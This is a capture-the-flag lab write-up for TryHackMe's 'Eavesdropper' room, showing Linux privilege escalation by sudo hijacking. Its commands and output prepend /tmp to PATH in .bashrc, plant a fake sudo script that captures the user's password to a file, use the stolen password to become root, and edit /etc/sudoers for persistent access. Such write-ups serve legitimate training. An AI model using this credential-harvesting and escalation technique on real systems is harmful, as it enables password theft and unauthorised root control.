# TryHackMe-Eavesdropper

**Scope:**

- SUDO Hijacking

**Keywords:**

- SSH Connection with ID RSA
- PATH Manipulation
- .bashrc Manipulation
- SUDOEDIT
- sudoers Manipulation
- pspy64

**Main Commands:**

- `chmod 600 id_rsa`
- `ssh -i id_rsa frank@10.10.62.113`
- `scp -i id_rsa pspy64 frank@10.10.62.113:/tmp`

**System Commands:**

- `find / -type f -perm -u=s 2>/dev/null`
- `/usr/bin/sudo --version`
- `echo $PATH`
- `source ~/.bashrc`
- `sudoedit /etc/sudoers`
- `sudo su`

### Laboratory Environment

[Eavesdropper](https://tryhackme.com/r/room/eavesdropper)

> **Laboratory Requirements**
> 

```jsx
YOU MUST DOWNLOAD THE TASK FILE FOR SSH CONNECTION
```

### Penetration Approaches and Commands

> **SSH Connection Phase**
> 

`cp id-rsa-1647296932800.id-rsa id_rsa`

`chmod 600 id_rsa`

`ssh -i id_rsa frank@10.10.62.113`

```jsx
frank@workstation:~$ whoami
frank
frank@workstation:~$ id
uid=1000(frank) gid=1000(frank) groups=1000(frank),27(sudo)
frank@workstation:~$ pwd
/home/frank
frank@workstation:~$ ls -lsa
total 32
4 drwxr-xr-x 1 frank frank 4096 Mar 14  2022 .
8 drwxr-xr-x 1 root  root  4096 Mar 14  2022 ..
0 lrwxrwxrwx 1 frank frank    9 Mar 14  2022 .bash_history -> /dev/null
4 -rw-r--r-- 1 frank frank  220 Feb 25  2020 .bash_logout
4 -rw-r--r-- 1 frank frank 3771 Feb 25  2020 .bashrc
4 drwx------ 2 frank frank 4096 Mar 14  2022 .cache
4 -rw-r--r-- 1 frank frank  807 Feb 25  2020 .profile
4 drwxr-xr-x 1 frank frank 4096 Mar 14  2022 .ssh
0 -rw-r--r-- 1 frank frank    0 Mar 14  2022 .sudo_as_admin_successful
frank@workstation:~$ uname -a
Linux workstation 5.4.0-96-generic #109-Ubuntu SMP Wed Jan 12 16:49:16 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
frank@workstation:~$ dpkg --version
Debian 'dpkg' package management program version 1.19.7 (amd64).
This is free software; see the GNU General Public License version 2 or
later for copying conditions. There is NO warranty.
frank@workstation:~$ ls -lsa /home
total 16
8 drwxr-xr-x 1 root  root  4096 Mar 14  2022 .
4 drwxr-xr-x 1 root  root  4096 Mar 14  2022 ..
4 drwxr-xr-x 1 frank frank 4096 Mar 14  2022 frank

frank@workstation:~$ ps -aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.1  0.7  12172  7236 ?        Ss   07:54   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 start
root         502  0.0  0.8  13584  8940 ?        Ss   07:59   0:00 sshd: frank [priv]
frank        513  0.0  0.5  13908  5288 ?        S    07:59   0:00 sshd: frank@pts/0
frank        514  0.0  0.3   5992  3924 pts/0    Ss   07:59   0:00 -bash
frank        707  0.0  0.3   7884  3200 pts/0    R+   08:01   0:00 ps -aux
frank@workstation:~$ ss -tulwn
Netid      State       Recv-Q      Send-Q           Local Address:Port             Peer Address:Port      Process      
udp        UNCONN      0           0                   127.0.0.11:57442                 0.0.0.0:*                      
tcp        LISTEN      0           128                    0.0.0.0:22                    0.0.0.0:*                      
tcp        LISTEN      0           4096                127.0.0.11:37385                 0.0.0.0:*                      
tcp        LISTEN      0           128                       [::]:22                       [::]:*                      

frank@workstation:~$ find / -type f -perm -u=s 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/mount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/umount
/usr/bin/sudo

frank@workstation:~$ /usr/bin/sudo --version
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31

frank@workstation:~$ 
```

> **Internal Process Investigation**
> 

`wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64`

```jsx
pspy64                        100%[================================================>]   2.96M  4.22MB/s    in 0.7s    

2024-11-18 03:07:43 (4.22 MB/s) - ‘pspy64’ saved [3104768/3104768]
```

**For source:**

[https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

`scp -i id_rsa pspy64 frank@10.10.62.113:/tmp`

```jsx
pspy64          100% 3032KB 495.1KB/s   00:06
```

```jsx
frank@workstation:~$ chmod +x /tmp/pspy64
frank@workstation:~$ cd /tmp
frank@workstation:/tmp$ ./pspy64

[REDACTED] - MORE

2024/11/18 08:08:34 CMD: UID=0     PID=1498   | sudo cat /etc/shadow 

[REDACTED] - MORE

frank@workstation:/tmp$
```

> **Privilege Escalation with SUDO Hijacking**
> 

**For more information:**

[sudo 1.8.0 to 1.9.12p1 - Privilege Escalation](https://www.exploit-db.com/exploits/51217)

[Linux Privilege Escalation | HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-hijacking)

```jsx
frank@workstation:/tmp$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
frank:x:1000:1000::/home/frank:/bin/bash

frank@workstation:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

frank@workstation:/tmp$ cd /home/frank
frank@workstation:~$ ls -lsa
total 32
4 drwxr-xr-x 1 frank frank 4096 Mar 14  2022 .
8 drwxr-xr-x 1 root  root  4096 Mar 14  2022 ..
0 lrwxrwxrwx 1 frank frank    9 Mar 14  2022 .bash_history -> /dev/null
4 -rw-r--r-- 1 frank frank  220 Feb 25  2020 .bash_logout
4 -rw-r--r-- 1 frank frank 3771 Feb 25  2020 .bashrc
4 drwx------ 2 frank frank 4096 Mar 14  2022 .cache
4 -rw-r--r-- 1 frank frank  807 Feb 25  2020 .profile
4 drwxr-xr-x 1 frank frank 4096 Mar 14  2022 .ssh
0 -rw-r--r-- 1 frank frank    0 Mar 14  2022 .sudo_as_admin_successful
frank@workstation:~$ nano .bashrc

[REDACTED] - MORE

# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

[REDACTED] - MORE

frank@workstation:~$ exit
```

`ssh -i id_rsa frank@10.10.62.113`

```jsx
frank@workstation:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

frank@workstation:~$ nano /tmp/sudo

#!/bin/bash
read -sp "[sudo] password for $USER: " passvar
echo $passvar > /tmp/frankpassword.txt
echo

frank@workstation:~$ chmod +x /tmp/sudo
frank@workstation:~$ source ~/.bashrc
frank@workstation:~$ exit

```

`ssh -i id_rsa frank@10.10.62.113`

```jsx
frank@workstation:~$ cat /tmp/frankpassword.txt
!@#frankisawesome2022%*
frank@workstation:~$ nano .bashrc

[REDACTED] - DELETING PATH INPUT - MAKE IT DEFAULT

frank@workstation:~$ exit
```

`ssh -i id_rsa frank@10.10.62.113`

```jsx
frank@workstation:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

frank@workstation:~$ sudo su
[sudo] password for frank: !@#frankisawesome2022%*
root@workstation:/home/frank# whoami
root
root@workstation:/home/frank# id
uid=0(root) gid=0(root) groups=0(root)
root@workstation:/home/frank# pwd
/home/frank
root@workstation:/home/frank# 
```

```jsx
frank@workstation:~$ sudoedit /etc/sudoers

[REDACTED] - MORE

# User privilege specification
root    ALL=(ALL:ALL) ALL
frank   ALL=(ALL:ALL) ALL

[REDACTED] - MORE

frank@workstation:~$ sudo su
root@workstation:/home/frank# whoami
root
root@workstation:/home/frank# id
uid=0(root) gid=0(root) groups=0(root)

root@workstation:/home/frank# 

```